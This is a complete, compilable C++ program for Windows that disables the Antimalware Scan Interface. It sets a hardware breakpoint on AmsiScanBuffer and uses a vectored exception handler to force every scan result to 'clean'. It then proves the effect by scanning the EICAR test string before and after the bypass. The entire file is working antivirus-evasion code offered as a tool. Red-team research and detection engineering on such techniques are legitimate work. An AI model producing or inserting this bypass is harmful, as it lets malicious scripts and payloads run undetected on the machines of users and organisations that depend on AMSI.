#include <Windows.h>
#include <amsi.h>
#include <iostream>
#include <string>
#include <memory>
#include <iomanip>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "amsi.lib")

using std::cout;
using std::cerr;
using std::endl;
using std::hex;
using std::dec;

// NT API declarations for thread context manipulation
extern "C" {
	NTSTATUS NTAPI NtGetContextThread(
		HANDLE threadHandle,
		PCONTEXT contextPtr
	);

	NTSTATUS NTAPI NtSetContextThread(
		HANDLE threadHandle,
		PCONTEXT contextPtr
	);
}

// Global state
namespace GlobalState {
	void* g_amsiScanBufferAddress = nullptr;
	const AMSI_RESULT AMSI_RESULT_CLEAN = static_cast<AMSI_RESULT>(0);
}

// Helper functions for context manipulation
namespace ContextHelper {

	inline DWORD64 GetReturnAddress(const CONTEXT* context) noexcept
	{
		return *reinterpret_cast<const DWORD64*>(context->Rsp);
	}

	inline void SetInstructionPointer(CONTEXT* context, DWORD64 newAddress) noexcept
	{
		context->Rip = newAddress;
	}

	inline void AdjustStackPointer(CONTEXT* context, int offset) noexcept
	{
		context->Rsp += offset;
	}

	inline void SetReturnValue(CONTEXT* context, DWORD64 value) noexcept
	{
		context->Rax = value;
	}

	void* GetFunctionArgument(const CONTEXT* context, int argumentIndex) noexcept
	{
		// Windows x64 calling convention: RCX, RDX, R8, R9, then stack
		switch (argumentIndex)
		{
		case 0: return reinterpret_cast<void*>(context->Rcx);
		case 1: return reinterpret_cast<void*>(context->Rdx);
		case 2: return reinterpret_cast<void*>(context->R8);
		case 3: return reinterpret_cast<void*>(context->R9);
		default:
			return *reinterpret_cast<void**>(context->Rsp + 8 * (argumentIndex + 1));
		}
	}

}

namespace HardwareBreakpoint {

	DWORD64 SetBits(DWORD64 value, int lowBitPosition, int bitCount, DWORD64 newValue) noexcept
	{
		const DWORD64 mask = (1ULL << bitCount) - 1;
		value &= ~(mask << lowBitPosition);
		value |= ((newValue & mask) << lowBitPosition);
		return value;
	}

	void ClearBreakpoint(CONTEXT* context, int breakpointIndex) noexcept
	{
		switch (breakpointIndex)
		{
		case 0: context->Dr0 = 0; break;
		case 1: context->Dr1 = 0; break;
		case 2: context->Dr2 = 0; break;
		case 3: context->Dr3 = 0; break;
		default: return;
		}
		context->Dr7 = SetBits(context->Dr7, breakpointIndex * 2, 1, 0);
		context->Dr6 = 0;
		context->EFlags = 0;
	}

	void EnableBreakpoint(CONTEXT* context, void* address, int breakpointIndex) noexcept
	{
		const DWORD64 addressValue = reinterpret_cast<DWORD64>(address);
		
		switch (breakpointIndex)
		{
		case 0: context->Dr0 = addressValue; break;
		case 1: context->Dr1 = addressValue; break;
		case 2: context->Dr2 = addressValue; break;
		case 3: context->Dr3 = addressValue; break;
		default: return;
		}

		context->Dr7 = SetBits(context->Dr7, 16, 16, 0);
		context->Dr7 = SetBits(context->Dr7, breakpointIndex * 2, 1, 1);
		context->Dr6 = 0;
	}

}

static LONG WINAPI VectoredExceptionHandler(EXCEPTION_POINTERS* exceptionInfo)
{
	const EXCEPTION_RECORD* exceptionRecord = exceptionInfo->ExceptionRecord;
	CONTEXT* contextRecord = exceptionInfo->ContextRecord;

	// Check for single-step exception at AmsiScanBuffer
	if (exceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP &&
		exceptionRecord->ExceptionAddress == GlobalState::g_amsiScanBufferAddress)
	{
		cout << "AMSI Bypass invoked at address: 0x" 
		     << hex << exceptionRecord->ExceptionAddress << dec << endl;

		// Get return address from stack
		const DWORD64 returnAddress = ContextHelper::GetReturnAddress(contextRecord);

		// Get the 6th argument (AMSI_RESULT* result) using x64 calling convention
		auto* scanResultPtr = static_cast<AMSI_RESULT*>(
			ContextHelper::GetFunctionArgument(contextRecord, 5)
		);

		// Modify the AmsiScanBuffer result to AMSI_RESULT_CLEAN
		if (scanResultPtr)
		{
			const AMSI_RESULT originalResult = *scanResultPtr;
			cout << "Original AMSI result: " << originalResult << endl;
			*scanResultPtr = GlobalState::AMSI_RESULT_CLEAN;
			cout << "Modified AMSI result to: " << GlobalState::AMSI_RESULT_CLEAN << endl;
		}

		// Restore normal execution flow
		ContextHelper::SetInstructionPointer(contextRecord, returnAddress);
		ContextHelper::AdjustStackPointer(contextRecord, sizeof(void*));
		ContextHelper::SetReturnValue(contextRecord, S_OK);

		// Clear the hardware breakpoint
		HardwareBreakpoint::ClearBreakpoint(contextRecord, 0);

		return EXCEPTION_CONTINUE_EXECUTION;
	}

	return EXCEPTION_CONTINUE_SEARCH;
}

// AMSI Context wrapper for RAII
class AmsiContext
{
private:
	HAMSICONTEXT m_context;
	HAMSISESSION m_session;
	bool m_isInitialized;

public:
	explicit AmsiContext(const wchar_t* applicationName) 
		: m_context(nullptr)
		, m_session(nullptr)
		, m_isInitialized(false)
	{
		HRESULT hr = AmsiInitialize(applicationName, &m_context);
		if (FAILED(hr))
		{
			cerr << "Failed to initialize AMSI: 0x" << hex << hr << dec << endl;
			return;
		}

		hr = AmsiOpenSession(m_context, &m_session);
		if (FAILED(hr))
		{
			cerr << "Failed to open AMSI session: 0x" << hex << hr << dec << endl;
			AmsiUninitialize(m_context);
			return;
		}

		m_isInitialized = true;
	}

	~AmsiContext()
	{
		if (m_isInitialized)
		{
			if (m_session)
				AmsiCloseSession(m_context, m_session);
			if (m_context)
				AmsiUninitialize(m_context);
		}
	}

	AmsiContext(const AmsiContext&) = delete;
	AmsiContext& operator=(const AmsiContext&) = delete;

	AmsiContext(AmsiContext&& other) noexcept
		: m_context(other.m_context)
		, m_session(other.m_session)
		, m_isInitialized(other.m_isInitialized)
	{
		other.m_context = nullptr;
		other.m_session = nullptr;
		other.m_isInitialized = false;
	}

	bool IsInitialized() const noexcept { return m_isInitialized; }

	AMSI_RESULT ScanBuffer(const std::string& buffer, const wchar_t* contentName) const
	{
		if (!m_isInitialized)
			return AMSI_RESULT_NOT_DETECTED;

		AMSI_RESULT result = AMSI_RESULT_NOT_DETECTED;
		const HRESULT hr = AmsiScanBuffer(
			m_context,
			const_cast<void*>(static_cast<const void*>(buffer.c_str())),
			static_cast<ULONG>(buffer.length()),
			contentName,
			m_session,
			&result
		);

		if (FAILED(hr))
		{
			cerr << "AmsiScanBuffer failed: 0x" << hex << hr << dec << endl;
			return AMSI_RESULT_NOT_DETECTED;
		}

		return result;
	}
};

static bool SetupAmsiBypass()
{
	cout << "Setting up AMSI bypass..." << endl;

	// Get or load amsi.dll module
	HMODULE amsiModule = GetModuleHandleA("amsi.dll");
	if (!amsiModule)
	{
		amsiModule = LoadLibraryA("amsi.dll");
		if (!amsiModule)
		{
			cerr << "Failed to load amsi.dll" << endl;
			return false;
		}
	}

	// Resolve AmsiScanBuffer function address
	GlobalState::g_amsiScanBufferAddress = GetProcAddress(amsiModule, "AmsiScanBuffer");
	if (!GlobalState::g_amsiScanBufferAddress)
	{
		cerr << "Failed to get AmsiScanBuffer address" << endl;
		return false;
	}
	cout << "AmsiScanBuffer found at: 0x" << hex << GlobalState::g_amsiScanBufferAddress << dec << endl;

	// Register vectored exception handler
	const PVOID exceptionHandler = AddVectoredExceptionHandler(1, VectoredExceptionHandler);
	if (!exceptionHandler)
	{
		cerr << "Failed to add vectored exception handler" << endl;
		return false;
	}
	cout << "Exception handler registered" << endl;

	// Get current thread context
	CONTEXT threadContext{};
	threadContext.ContextFlags = CONTEXT_ALL;

	NTSTATUS status = NtGetContextThread(GetCurrentThread(), &threadContext);
	if (status != 0)
	{
		cerr << "Failed to get thread context: 0x" << hex << status << dec << endl;
		return false;
	}

	// Enable hardware breakpoint on AmsiScanBuffer
	HardwareBreakpoint::EnableBreakpoint(&threadContext, GlobalState::g_amsiScanBufferAddress, 0);

	// Apply modified context to current thread
	status = NtSetContextThread(GetCurrentThread(), &threadContext);
	if (status != 0)
	{
		cerr << "Failed to set thread context: 0x" << hex << status << dec << endl;
		return false;
	}

	cout << "Hardware breakpoint set on AmsiScanBuffer" << endl;
	return true;
}

static bool TestAmsiBypass()
{
	cout << "Testing AMSI bypass..." << endl;

	AmsiContext amsiContext(L"TestApp");
	if (!amsiContext.IsInitialized())
	{
		cerr << "Failed to initialize AMSI context" << endl;
		return false;
	}

	// EICAR test string for malware detection testing
	const std::string eicarTestString = 
		"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

	cout << "\nScanning EICAR string BEFORE bypass..." << endl;
	const AMSI_RESULT resultBeforeBypass = amsiContext.ScanBuffer(eicarTestString, L"TestContent");

	if (resultBeforeBypass == GlobalState::AMSI_RESULT_CLEAN)
	{
		cout << "Invalid test, the string was not detected as malicious before bypass." << endl;
	}
	else
	{
		cout << "AMSI detected the string as malicious before bypass. Normal flow" << endl;
	}

	// Setup the bypass mechanism
	if (!SetupAmsiBypass())
	{
		cerr << "Failed to setup AMSI bypass" << endl;
		return false;
	}

	cout << "\nScanning EICAR string AFTER bypass..." << endl;
	const AMSI_RESULT resultAfterBypass = amsiContext.ScanBuffer(eicarTestString, L"TestContent");

	if (resultAfterBypass == GlobalState::AMSI_RESULT_CLEAN)
	{
		cout << "AMSI bypassed, the string was not detected as malicious." << endl;
		return true;
	}
	else
	{
		cout << "AMSI wins, the string was detected as malicious." << endl;
		return false;
	}
}

int main()
{
	const bool bypassSuccessful = TestAmsiBypass();

	if (bypassSuccessful)
	{
		cout << "\nBypass successful!" << endl;
	}
	else
	{
		cout << "\nBypass failed!" << endl;
	}

	std::cin.get();	
	return bypassSuccessful ? EXIT_SUCCESS : EXIT_FAILURE;
}